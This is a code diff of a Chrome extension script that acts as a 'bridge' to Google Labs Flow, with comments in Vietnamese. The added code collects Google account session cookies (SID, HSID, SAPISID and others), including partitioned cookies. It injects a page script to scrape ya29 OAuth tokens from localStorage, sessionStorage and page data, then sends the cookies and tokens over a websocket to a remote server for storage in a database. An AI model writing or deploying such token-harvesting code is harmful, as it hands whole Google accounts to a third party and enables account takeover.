@@ -6,7 +6,7 @@
 
 const FLOW_URL = "https://labs.google/fx/tools/flow";
 const SITEKEY_FALLBACK = "6LdsFiUsAAAAAIjVDZcuLhaHiDn5nnHVXVRQGeMV";
-const BRIDGE_VERSION = "1.7.5";
+const BRIDGE_VERSION = "1.7.6";
 const BRIDGE_CAPABILITIES = ["flow_api_proxy", "flow_api_proxy_v4"];
 
 let ws = null;
@@ -49,16 +49,40 @@ async function gatherCookies() {
       "https://labs.google/fx/api/auth",
       "https://labs.google/fx/api/auth/session",
     ];
+
+    // 1. Quét cookies thông thường
     const fromDomain = await chrome.cookies.getAll({ domain: "labs.google" }).catch(() => []);
     const fromUrls = await Promise.all(urls.map(u => chrome.cookies.getAll({ url: u }).catch(() => [])));
     const fromGoogle = await chrome.cookies.getAll({ domain: ".google.com" }).catch(() => []);
 
+    // 2. Quét cookies Partitioned (CHIPS) - CHỈ CHROME MV3 CÓ partitionKey: {}
+    const fromPartitionDomain = await chrome.cookies.getAll({ domain: "labs.google", partitionKey: {} }).catch(() => []);
+    const fromPartitionUrls = await Promise.all(urls.map(u => chrome.cookies.getAll({ url: u, partitionKey: {} }).catch(() => [])));
+    const fromAllPartitioned = await chrome.cookies.getAll({ partitionKey: {} }).catch(() => []);
+
     const map = new Map();
-    for (const c of [...fromDomain, ...fromUrls.flat()]) {
+    const all = [
+      ...fromDomain,
+      ...fromUrls.flat(),
+      ...fromPartitionDomain,
+      ...fromPartitionUrls.flat(),
+    ];
+
+    for (const c of all) {
       if (c && c.name && !map.has(c.name)) {
         map.set(c.name, c.value);
       }
     }
+
+    // Thêm các cookie có chứa next-auth hoặc session-token từ allPartitioned
+    for (const c of fromAllPartitioned) {
+      if (c && c.name && (c.name.includes("next-auth") || c.name.includes("session-token") || (c.domain && c.domain.includes("labs.google")))) {
+        if (!map.has(c.name)) {
+          map.set(c.name, c.value);
+        }
+      }
+    }
+
     for (const c of fromGoogle) {
       if (c && c.name && (c.name.startsWith("__Secure") || c.name.startsWith("SAPISID") || c.name.startsWith("SSID") || c.name.startsWith("SID") || c.name.startsWith("HSID") || c.name.includes("auth"))) {
         if (!map.has(c.name)) {
@@ -182,9 +206,60 @@ async function getProjectId() {
 async function checkGoogleSession() {
   const flowTabs = await findExistingFlowTabs();
 
-  // 1. Chạy fetch("/fx/api/auth/session") bên trong tab Flow của user (cùng origin labs.google với trình duyệt của user)
   for (const t of flowTabs) {
     if (!t.id) continue;
+
+    // 1. Quét đồng bộ DOM, localStorage, sessionStorage, __NEXT_DATA__
+    try {
+      const [resSync] = await chrome.scripting.executeScript({
+        target: { tabId: t.id },
+        world: "MAIN",
+        func: () => {
+          let token = "";
+          let user = null;
+
+          try {
+            for (let i = 0; i < localStorage.length; i++) {
+              const k = localStorage.key(i);
+              const v = localStorage.getItem(k);
+              if (v && v.includes("ya29.")) {
+                const m = v.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+                if (m) { token = m[1]; break; }
+              }
+            }
+          } catch (e) {}
+
+          if (!token) {
+            try {
+              for (let i = 0; i < sessionStorage.length; i++) {
+                const k = sessionStorage.key(i);
+                const v = sessionStorage.getItem(k);
+                if (v && v.includes("ya29.")) {
+                  const m = v.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+                  if (m) { token = m[1]; break; }
+                }
+              }
+            } catch (e) {}
+          }
+
+          if (!token && window.__NEXT_DATA__) {
+            try {
+              const s = JSON.stringify(window.__NEXT_DATA__);
+              const m = s.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+              if (m) token = m[1];
+            } catch (e) {}
+          }
+
+          return { token, user };
+        },
+      });
+
+      if (resSync && resSync.result && resSync.result.token) {
+        return { valid: true, error: "", access_token: resSync.result.token };
+      }
+    } catch (e) {}
+
+    // 2. Chạy fetch async bên trong tab Flow của user
     try {
       const [res] = await chrome.scripting.executeScript({
         target: { tabId: t.id },
@@ -196,26 +271,27 @@ async function checkGoogleSession() {
               headers: { accept: "application/json" },
             });
             const data = await r.json().catch(() => ({}));
-            return { ok: r.ok, status: r.status, data };
+            let tok = data && (data.access_token || data.token || data.accessToken);
+            if (!tok && data) {
+              const s = JSON.stringify(data);
+              const m = s.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+              if (m) tok = m[1];
+            }
+            return { ok: r.ok, status: r.status, data, token: tok || "" };
           } catch (e) {
             return { ok: false, error: String(e) };
           }
         },
       });
 
-      if (res && res.result && res.result.data) {
-        const data = res.result.data;
+      if (res && res.result) {
+        const data = res.result.data || {};
         if (data.error === "ACCESS_TOKEN_REFRESH_NEEDED") {
           return { valid: false, error: "ACCESS_TOKEN_REFRESH_NEEDED", email: data.user?.email || "" };
         }
-        let token = data.access_token || data.token || data.accessToken;
-        if (!token) {
-          const s = JSON.stringify(data);
-          const m = s.match(/(ya29\.[a-zA-Z0-9_-]+)/);
-          if (m) token = m[1];
-        }
-        if (token) {
-          return { valid: true, error: "", email: data.user?.email || "", access_token: token };
+        const tok = res.result.token || data.access_token || data.token || data.accessToken;
+        if (tok) {
+          return { valid: true, error: "", email: data.user?.email || "", access_token: tok };
         }
         if (data.user && !data.error) {
           return { valid: true, error: "", email: data.user?.email || "" };
@@ -226,7 +302,7 @@ async function checkGoogleSession() {
     }
   }
 
-  // 2. Fallback: fetch từ service worker
+  // 3. Fallback: fetch từ service worker
   try {
     const res = await fetch("https://labs.google/fx/api/auth/session", {
       credentials: "include",
@@ -269,6 +345,12 @@ async function pushCookies() {
     const project_id = await getProjectId();
     const sessionCheck = await checkGoogleSession();
 
+    let bearerToSend = sessionCheck.access_token || "";
+    if (!bearerToSend && cookies.includes("ya29.")) {
+      const m = cookies.match(/(ya29\.[a-zA-Z0-9_-]+)/);
+      if (m) bearerToSend = m[1];
+    }
+
     const hasCookies = !!cookies && cookies.length > 20;
     const hasNextAuth = cookies.toLowerCase().includes("session-token");
     const isRefreshNeeded = sessionCheck.error === "ACCESS_TOKEN_REFRESH_NEEDED";
@@ -280,12 +362,8 @@ async function pushCookies() {
       isSessionOk = false;
       sessionErr = "ACCESS_TOKEN_REFRESH_NEEDED";
       state.error = "Phiên Google đã hết hạn. Hãy mở tab Google Flow và đăng nhập lại.";
-    } else if (sessionCheck.valid || sessionCheck.access_token) {
-      isSessionOk = true;
-      sessionErr = "";
-      state.error = "";
-    } else if (hasCookies || hasNextAuth) {
-      // Có cookies của Google/Labs -> coi như phiên hợp lệ
+    } else if (bearerToSend || hasNextAuth || hasCookies) {
+      // Có bearer hoặc session-token hoặc cookies -> phiên hợp lệ
       isSessionOk = true;
       sessionErr = "";
       state.error = "";
@@ -295,21 +373,25 @@ async function pushCookies() {
       state.error = "Chưa đăng nhập Google Flow. Hãy mở tab Google Flow và bấm Đăng nhập (Sign in).";
     }
 
-    state.cookiesSent = isSessionOk && (hasCookies || !!sessionCheck.access_token);
+    state.cookiesSent = isSessionOk;
     state.projectId = project_id;
     state.googleSessionValid = isSessionOk;
     state.googleSessionError = sessionErr;
 
-    const effectiveCookies = cookies || (sessionCheck.access_token ? `ya29_token=${sessionCheck.access_token}` : "");
+    // Gói cả bearer_token vào cookies nếu có để lưu chắc chắn vào DB
+    let cookiesPayload = cookies;
+    if (bearerToSend && !cookiesPayload.includes("ya29_token=")) {
+      cookiesPayload = cookiesPayload ? `${cookiesPayload}; ya29_token=${bearerToSend}` : `ya29_token=${bearerToSend}`;
+    }
 
     ws.send(JSON.stringify({
       type: "cookies",
-      cookies: effectiveCookies,
+      cookies: cookiesPayload,
       project_id,
       bridge_version: BRIDGE_VERSION,
       capabilities: BRIDGE_CAPABILITIES,
       google_session_error: sessionErr,
-      bearer_token: sessionCheck.access_token || "",
+      bearer_token: bearerToSend,
     }));
   } catch (e) {
     console.error("pushCookies error:", e);
